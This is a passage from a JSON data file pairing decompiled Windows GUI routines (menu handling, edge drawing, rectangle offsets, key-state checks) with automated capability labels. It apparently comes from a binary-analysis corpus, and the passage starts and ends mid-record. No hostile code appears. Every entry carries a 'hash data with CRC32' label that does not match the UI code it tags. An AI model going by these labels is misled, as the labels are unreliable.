0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc - 4) - *(lprc - 0xc)) {\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc - 4) - *(lprc - 0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc - 0xc) = iVar5 + *(lprc - 0xc) + 1;\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                    *(lprc - 4) = iVar5 + *(lprc - 0xc);\n                }\n                fcn.0041d5e4();\n                *(lprc - 0x10) = *(lprc - 0x5c);\n                *(lprc - 0xc) = *(lprc - 0x58);\n                *(lprc - 8) = *(lprc - 0x54);\n                *(lprc - 4) = *(lprc - 0x50);\n            }\n            else {\n                iVar5 = *(*(lprc - 0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00446b64(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.00421984();\n                    *(lprc - 0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc - 0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.00422acc();\n                    *(lprc - 0x48) = *(*(*(lprc - 0x28) + 0xc) + 0x18);\n                    fcn.0041c8f0();\n                    iVar5 = *(lprc - 0x4c);\n                    iVar6 = (**(**(lprc - 0x4c) + 0x20))();\n                    uVar8 = (*(lprc - 4) - *(lprc - 0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc - 0x4c) + 0x2c))(iVar6 + *(lprc - 0xc) + 1);\n                    fcn.0041d3b4(iVar5);\n                    fcn.0041c8f0();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00403258(0x44a520);\n                    return;\n                }\n                fcn.0044707c(*(lprc - 0x38) & 0xffffff00 | *(*(lprc - 0x38) + 0x39), *(*(lprc - 0x38) + 0x40), \n                             *(lprc - 0xc));\n            }\n            if (*(*(lprc - 0x38) + 0x38) != '\\0') {\n                *(lprc - 8) = *(lprc - 8) + -1;\n                *(lprc - 4) = *(lprc - 4) + -1;\n            }\n        }\n    }\n    *(lprc - 0x10) = *(lprc - 0x10) + -1;\n    *(lprc - 0xc) = *(lprc - 0xc) + -1;\n    *(lprc - 8) = *(lprc - 8) + 2;\n    *(lprc - 4) = *(lprc - 4) + 2;\n    if (((*(*(lprc - 0x38) + 0x38) != '\\0') || ((*(lprc - 0x29) != '\\0' && (*(lprc - 0x39) != '\\0')))) &&\n       (*(lprc - 0x21) == '\\0')) {\n        uVar7 = fcn.0041d804();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc - 0x29) != '\\0') {\n        if (*(lprc - 0x39) != '\\0') {\n            *(lprc - 0x20) = *(lprc - 8) + 1;\n        }\n        if ((*(lprc - 0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.0041d0bc();\n        }\n        fcn.0041d460();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc - 0x5d) != '\\0')) && (*(lprc - 0x21) == '\\0')) {\n        if (*(lprc - 0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.0041d804();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.0041d804();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc - 0x29) == '\\0') {\n            iStack32 = lprc - 0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc - 0x29) == '\\0') || (*(lprc - 0x39) == '\\0')) {\n        *(lprc - 0x20) = *(lprc - 8) + 1;\n    }\n    *(lprc - 0x20) = *(lprc - 0x20) + 2;\n    *(lprc - 0x18) = *(lprc - 0x18) + -1;\n    *(lprc - 100) = *(*(lprc - 0x31) * 2 + 0x461ca8) | 0x60;\n    if ((*(lprc - 0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc - 100) = *(lprc - 100) | 0x100000;\n    }\n    *(lprc - 0x5c) = *(lprc - 0x20);\n    *(lprc - 0x58) = *(lprc - 0x1c);\n    *(lprc - 0x54) = *(lprc - 0x18);\n    *(lprc - 0x50) = *(lprc - 0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.0041cbbc();\n    }\n    fcn.00449d78(*(lprc - 100) | 0x500, lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    uVar8 = (*(lprc - 0x50) - *(lprc - 0x58)) - (*(lprc - 0x14) - *(lprc - 0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc - 0x20, 0, iVar5);\n    if ((((*(lprc + 8) != '\\0') && (*(lprc - 0x29) != '\\0')) && (*(lprc - 0x5d) != '\\0')) && (*(lprc - 0x21) == '\\0')) {\n        sub.user32.dll_OffsetRect(lprc - 0x20, 1, 0);\n    }\n    fcn.00449d78(*(lprc - 100), lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    if ((*(*(lprc - 0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        *(lprc - 0x20) = *(lprc - 0x18);\n        *(lprc - 0x18) = *(lprc - 0x54) + -10;\n        iVar5 = lprc - 0x20;\n        uVar8 = lprc & 0xffffff00 | *(lprc - 0x29);\n        in_stack_ffffffa4 = 2;\n        fcn.00448e3c();\n        fcn.00449d78(in_stack_ffffffa4, uVar8, iVar5);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00403fa8(0x44a8b7);\n    return;\n}\n",
        "token_count": 4078
    },
    "0044a8d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044a8d0(uint32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x44b1d8;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puVar2 = &stack0xfffffffc;\n    if (*(lprc - 0x21) != '\\0') {\n        if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n            puVar2 = &stack0xfffffffc;\n            if (*(lprc + 8) != '\\0') {\n                fcn.0041d0bc();\n                puVar2 = puStack24;\n            }\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            fcn.0041d0bc();\n            fcn.0041c8f0();\n            puVar2 = puStack24;\n        }\n    }\n    puStack24 = puVar2;\n    if ((*(lprc - 0x29) == '\\0') || ((*(lprc - 0x21) != '\\0' && (*(*(lprc - 0x38) + 0x38) == '\\0')))) {\n        fcn.0041d460();\n    }\n    if (*(lprc - 0x30) == 0) {\n        cVar3 = fcn.004033e4();\n        if (cVar3 == '\\0') {\n            *(lprc - 0x31) = 0;\n        }\n        else {\n            *(lprc - 0x31) = *(*(lprc - 0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc - 0x31) = 0;\n    }\n    *(lprc - 8) = *(lprc - 0x18) + -1;\n    iVar5 = *(lprc - 0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc - 0xc) = iVar5;\n    fcn.004043b4();\n    if (bVar9) {\n        fcn.0041d460();\n        *(lprc - 0x10) = *(lprc - 8) + 2;\n        *(lprc - 8) = 0;\n        *(lprc - 0x39) = 0;\n    }\n    else {\n        if ((*(lprc - 0x40) == 0) ||\n           (((iVar5 = *(*(lprc - 0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00446b64(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc - 0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc - 0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0'))))\n            )))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc - 0x41) = uVar4;\n        if ((*(lprc - 0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc - 0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0')))) {\n            if ((*(lprc - 0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc - 0x10) = *(lprc - 8);\n                *(lprc - 4) = *(lprc - 0xc);\n            }\n            else {\n                *(lprc - 0x10) = *(lprc - 8) - *(*(lprc - 0x40) + 0x34);\n                *(lprc - 4) = *(lprc - 0xc) + *(*(lprc - 0x40) + 0x30);\n            }\n            *(lprc - 0x39) = 0;\n        }\n        else {\n            *(lprc - 0x39) = 1;\n            if (*(lprc - 0x41) == '\\0') {\n                *(lprc - 0x10) = *(lprc - 8) + -0x10;\n                *(lprc - 4) = *(lprc - 0xc) + 0x10;\n            }\n            else {\n                *(lprc - 0x10) = *(lprc - 8) - *(*(lprc - 0x40) + 0x34);\n                *(lprc - 4) = *(lprc - 0xc) + *(*(lprc - 0x40) + 0x30);\n            }\n            if (*(*(lprc - 0x38) + 0x38) != '\\0') {\n                *(lprc - 0x10) = *(lprc - 0x10) + -1;\n                *(lprc - 4) = *(lprc - 4) + 1;\n                uVar7 = fcn.0041d0b4();\n                *(lprc - 0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.0041d0b4();\n                    *(lprc - 0x48) = uVar7;\n                    fcn.00423b70();\n                    fcn.0041d090();\n                    fcn.0041d460();\n                }\n                else {\n                    fcn.0041d0bc();\n                    fcn.0041d460();\n                }\n                fcn.0041d0bc();\n                *(lprc - 8) = *(lprc - 8) + -1;\n                *(lprc - 0xc) = *(lprc - 0xc) + 1;\n            }\n            if (*(lprc - 0x41) == '\\0') {\n                *(lprc - 0x5c) = *(lprc - 0x10);\n                *(lprc - 0x58) = *(lprc - 0xc);\n                *(lprc - 0x54) = *(lprc - 8);\n                *(lprc - 0x50) = *(lprc - 4);\n                iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc - 8) - *(lprc - 0x10)) {\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc - 8) - *(lprc - 0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc - 8) = (*(lprc - 8) - iVar5) + 1;\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                    *(lprc - 0x10) = *(lprc - 8) - iVar5;\n                }\n                iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc - 4) - *(lprc - 0xc)) {\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc - 4) - *(lprc - 0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc - 0xc) = iVar5 + *(lprc - 0xc) + 1;\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                    *(lprc - 4) = iVar5 + *(lprc - 0xc);\n                }\n                fcn.0041d5e4();\n                *(lprc - 0x10) = *(lprc - 0x5c);\n                *(lprc - 0xc) = *(lprc - 0x58);\n                *(lprc - 8) = *(lprc - 0x54);\n                *(lprc - 4) = *(lprc - 0x50);\n            }\n            else {\n                iVar5 = *(*(lprc - 0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00446b64(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.00421984();\n                    *(lprc - 0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc - 0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.00422acc();\n                    *(lprc - 0x48) = *(*(*(lprc - 0x28) + 0xc) + 0x18);\n                    fcn.0041c8f0();\n                    iVar5 = *(lprc - 0x4c);\n                    iVar6 = (**(**(lprc - 0x4c) + 0x20))();\n                    uVar8 = (*(lprc - 4) - *(lprc - 0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc - 0x4c) + 0x2c))(iVar6 + *(lprc - 0xc) + 1);\n                    fcn.0041d3b4(iVar5);\n                    fcn.0041c8f0();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00403258(0x44ae30);\n                    return;\n                }\n                fcn.0044707c(*(lprc - 0x38) & 0xffffff00 | *(*(lprc - 0x38) + 0x39), *(*(lprc - 0x38) + 0x40), \n                             *(lprc - 0xc));\n            }\n            if (*(*(lprc - 0x38) + 0x38) != '\\0') {\n                *(lprc - 8) = *(lprc - 8) + -1;\n                *(lprc - 4) = *(lprc - 4) + -1;\n            }\n        }\n    }\n    *(lprc - 0x10) = *(lprc - 0x10) + -1;\n    *(lprc - 0xc) = *(lprc - 0xc) + -1;\n    *(lprc - 8) = *(lprc - 8) + 2;\n    *(lprc - 4) = *(lprc - 4) + 2;\n    if ((*(*(lprc - 0x38) + 0x38) != '\\0') ||\n       (((*(lprc - 0x29) != '\\0' && (*(lprc - 0x39) != '\\0')) && (*(lprc - 0x21) == '\\0')))) {\n        uVar7 = fcn.0041d804();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc - 0x29) != '\\0') {\n        if (*(lprc - 0x39) != '\\0') {\n            *(lprc - 0x18) = *(lprc - 0x10) + -1;\n        }\n        if ((*(lprc - 0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.0041d0bc();\n        }\n        fcn.0041d460();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc - 0x5d) != '\\0')) && (*(lprc - 0x21) == '\\0')) {\n        if (*(lprc - 0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.0041d804();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.0041d804();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc - 0x29) == '\\0') {\n            iStack32 = lprc - 0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc - 0x29) == '\\0') || (*(lprc - 0x39) == '\\0')) {\n        *(lprc - 0x18) = *(lprc - 0x10) + -1;\n    }\n    *(lprc - 0x20) = *(lprc - 0x20) + 2;\n    *(lprc - 0x18) = *(lprc - 0x18) + -1;\n    *(lprc - 100) = *(*(lprc - 0x31) * 2 + 0x461ca8) | 0x60;\n    if ((*(lprc - 0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc - 100) = *(lprc - 100) | 0x100000;\n    }\n    *(lprc - 0x5c) = *(lprc - 0x20);\n    *(lprc - 0x58) = *(lprc - 0x1c);\n    *(lprc - 0x54) = *(lprc - 0x18);\n    *(lprc - 0x50) = *(lprc - 0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.0041cbbc();\n    }\n    fcn.00449d78(*(lprc - 100) | 0x500, lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    *(lprc - 0x20) = *(lprc - 0x5c);\n    *(lprc - 0x18) = *(lprc - 0x54);\n    uVar8 = (*(lprc - 0x50) - *(lprc - 0x58)) - (*(lprc - 0x14) - *(lprc - 0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc - 0x20, 0, iVar5);\n    if (((*(lprc + 8) != '\\0') && (*(lprc - 0x29) != '\\0')) && (*(lprc - 0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(lprc - 0x20, 1, 0);\n    }\n    fcn.00449d78(*(lprc - 100), lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    if ((*(*(lprc - 0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        fcn.00448e3c();\n        *(lprc - 0x20) = 10;\n        iVar5 = fcn.0041d664();\n        *(lprc - 0x18) = iVar5 + *(lprc - 0x20);\n        in_stack_ffffffa4 = 2;\n        fcn.00449d78(2, lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00403fa8(0x44b1df);\n    return;\n}\n",
        "token_count": 4108
    },
    "0044b1f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b1f8(uint noname_0, uint32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_ECX;\n    uint var_65h;\n    uint var_5dh;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    var_20h = *in_ECX;\n    uStack32 = in_ECX[1];\n    uStack28 = in_ECX[2];\n    uStack24 = in_ECX[3];\n    iVar2 = fcn.0044bd10();\n    iVar3 = fcn.0044b32c();\n    if (((iVar2 == 0) || ((*(iVar2 + 0x40) == '\\0' && (iVar3 == 0)))) ||\n       ((*(in_EAX + 0x9a) == 0 && (*(in_EAX + 0x92) == 0)))) {\n        if ((iVar2 == 0) || (cVar1 = fcn.0044d34c(),  cVar1 != '\\0')) {\n            fcn.0044a8d0(&stack0xfffffffc);\n        }\n        else {\n            fcn.00449fc8(&stack0xfffffffc);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x34))(in_EAX & 0xffffff00 | (arg_ch & 1) != 0);\n        if (*(in_EAX + 0x9a) != 0) {\n            (*in_EAX[0x26])(&var_20h & 0xffff0000 | arg_ch & 0xffff, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 432
    },
    "0044bbd8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044bbd8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00403258();\n        *(in_EAX + 0x44) = 0;\n    }\n    else {\n        if (*(in_EAX + 0x44) == 0) {\n            iVar1 = fcn.00403454();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x44) = uVar2;\n        }\n        (**(**(in_EAX + 0x44) + 0xc))();\n        iVar1 = *(in_EAX + 0x44);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x44be6c;\n        fcn.00403454();\n        fcn.004195ec();\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0044d084": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d084(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint hMenu;\n    \n    iVar1 = sub.user32.dll_GetMenuItemCount();\n    puVar2 = arg_8h + -0x200;\n    iVar4 = 0;\n    while ((iVar4 < iVar1 && (puVar2 < arg_8h + -5))) {\n        fcn.0044d620(0x400, (arg_8h + -5) - puVar2, puVar2);\n        puVar2 = fcn.004085f4();\n        uVar3 = sub.user32.dll_GetMenuState();\n        if ((uVar3 & 2) != 0) {\n            *puVar2 = 0x24;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 0x40) != 0) {\n            *puVar2 = 0x40;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 1) != 0) {\n            *puVar2 = 0x23;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        *puVar2 = 0x3b;\n        puVar2 = puVar2 + 1;\n        *puVar2 = 0;\n        iVar4 = iVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "0044e090": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e090(uint32_t arg_8h)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint16_t extraout_var;\n    uint16_t extraout_var_00;\n    uint16_t extraout_var_01;\n    uint16_t uVar3;\n    uint var_15h;\n    uint var_4h;\n    \n    if ((**0x461f30 < 5) && ((**0x461f30 != 4 || (**0x4620e8 < 1)))) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.00403454();\n    uVar2 = fcn.004033e4();\n    if (((arg_8h & 1) == 0) || ((uVar2 != 0 && ((uVar2 == 0 || (bVar1)))))) {\n        if ((bVar1) && ((arg_8h & 0x80) != 0)) {\n            fcn.0041d0bc();\n            fcn.0041c8f0();\n            uVar3 = extraout_var_00;\n        }\n        else {\n            fcn.0041d0bc();\n            fcn.0041c8f0();\n            uVar3 = extraout_var_01;\n        }\n    }\n    else {\n        fcn.0041d0bc();\n        fcn.0041c8f0();\n        uVar3 = extraout_var;\n    }\n    (**(*in_EAX + 0x30))(arg_8h & 0xff00 | uVar3 << 0x10 | uVar2, arg_8h & 0xffff | uVar3 << 0x10);\n    return;\n}\n",
        "token_count": 401
    },
    "00450574": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00450574(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint32_t unaff_EBX;\n    uint32_t uVar2;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *0x4505c4;\n    if ((in_EAX & 4) != 0) {\n        uVar2 = uVar2 | 1;\n    }\n    if ((in_EAX & 8) != 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 1) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if ((in_EAX & 2) != 0) {\n        uVar2 = uVar2 | 0x10;\n    }\n    if ((in_EAX & 0x10) != 0) {\n        uVar2 = uVar2 | 0x20;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x12);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 267
    },
    "0045182c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045182c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_1 != param_2) {\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            *(*(in_EAX + 0x208) + 0x1e) = 1;\n            *(*(in_EAX + 0x20c) + 0x1e) = 1;\n        }\n        fcn.00450f50();\n        fcn.00450f50();\n        if (*(in_EAX + 0x210) == '\\0') {\n            if (*(*(in_EAX + 0x208) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x208) + 0x10), param_2, param_1);\n                fcn.004510a0();\n            }\n            if (*(*(in_EAX + 0x20c) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x20c) + 0x10), param_2, param_1);\n                fcn.004510a0();\n            }\n        }\n    }\n    *(*(in_EAX + 0x208) + 0x1e) = 0;\n    *(*(in_EAX + 0x20c) + 0x1e) = 0;\n    return;\n}\n",
        "token_count": 349
    },
    "00452960": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452960(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x2f4) & 1) == 0) {\n        if ((param_2 != '\\0') && (param_2 != *(in_EAX + 0x57))) {\n            fcn.00453a98();\n        }\n        fcn.0043944c();\n    }\n    else {\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x2f4) = *(in_EAX + 0x2f4) & 0xfd;\n            return;\n        }\n        *(in_EAX + 0x2f4) = *(in_EAX + 0x2f4) | 2;\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "0045432c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045432c(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4543d4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_2 == *(in_EAX + 0x220)) goto code_r0x004543be;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 == 0) goto code_r0x00454397;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX == param_2) {\ncode_r0x00454376:\n        puStack24 = puVar1;\n        fcn.00405b0c();\n        fcn.0040b538();\n        fcn.004039e4();\n        puVar1 = puStack24;\n    }\n    else {\n        iVar3 = fcn.004506c0();\n        puVar1 = puStack24;\n        if (in_EAX != iVar3) goto code_r0x00454376;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            cVar2 = fcn.00403454();\n            puVar1 = puStack24;\n            if (cVar2 == '\\0') goto code_r0x00454376;\n        }\n    }\ncode_r0x00454397:\n    puStack24 = puVar1;\n    *(in_EAX + 0x220) = param_2;\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        if (*(in_EAX + 0x22e) != '\\0') {\n            fcn.004546e4();\n        }\n        fcn.00403454();\n    }\ncode_r0x004543be:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4543db;\n    uStack28 = 0x4543d3;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 529
    },
    "00454c00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454c00(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x229) != '\\0') && ((*(*(arg_8h + -4) + 0x228) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x22f) != '\\x01')) {\n        uVar1 = fcn.0043fd08(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        if (*(*(arg_8h + -4) + 0x229) == '\\x03') {\n            sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 7, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 5, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf000, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n        }\n        else {\n            if ((*(*(arg_8h + -4) + 0x228) & 2) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf020, 1);\n            }\n            if ((*(*(arg_8h + -4) + 0x228) & 4) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf030, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "00456824": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00456824(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4568fb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.0043e7a4();\n    if (iVar1 == 1) {\n        fcn.004394a0();\n        fcn.00404098();\n        uVar2 = fcn.00404268();\n        fcn.00404468(uVar2);\n        fcn.004394b0();\n        iVar1 = fcn.00404268();\n        if (0 < iVar1) {\n            iVar3 = 1;\n            do {\n                if ((*(iVar3 + -1) == '\\n') || (*(iVar3 + -1) == '\\r')) {\n                    fcn.004045f4();\n                    break;\n                }\n                iVar3 = iVar3 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.0043955c();\n    }\n    fcn.0043e610();\n    fcn.00438a40();\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        fcn.00452960();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x456902;\n    uStack32 = 0x4568fa;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 414
    },
    "00401370": {
        "rules": [
